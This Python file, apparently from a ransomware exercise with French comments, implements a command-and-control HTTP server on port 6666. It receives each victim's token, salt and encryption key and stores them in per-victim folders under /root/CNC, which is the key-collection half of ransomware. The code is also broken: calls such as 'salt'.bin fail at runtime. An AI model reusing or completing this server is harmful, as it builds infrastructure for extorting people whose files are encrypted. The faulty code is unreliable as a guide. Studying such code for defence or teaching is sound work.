import base64
import hashlib
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        # Récupérer le token
        token = body["token"]
        # Décoder le token
        decode_token = base64.b64decode(token)
        # Hacher le token
        hash_token = hashlib.sha256(decode_token)
        # Récupérer la chaîne hexadécimale
        decrypted_token = hash_token.hexdigest()
        # Créer un chemin de répertoire à partir du token
        directory_path = os.path.join(CNC.ROOT_PATH, decrypted_token)
        # Créer le répertoire s'il n'existe pas
        if not os.path.exists(directory_path):
            os.makedirs(directory_path)
       
        # Récupérer les valeurs du sel et de la clé présent dans le dictionnaire body
        salt = body["salt"]
        key = body["key"]
        # Écrire le sel et la clé dans le répertoire
        self.save_b64(decrypted_token, salt, 'salt'.bin)
        self.save_b64(decrypted_token, key, 'key'.bin)

        # Tester si le répertoire existe
        if os.path.isdir(directory_path):
            # Retourner un dictionnaire indiquant le succès
            return {"status": "OK"}
        else:
            # Retourner un dictionnaire indiquant l'erreur
            return {"status": "Error"}

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()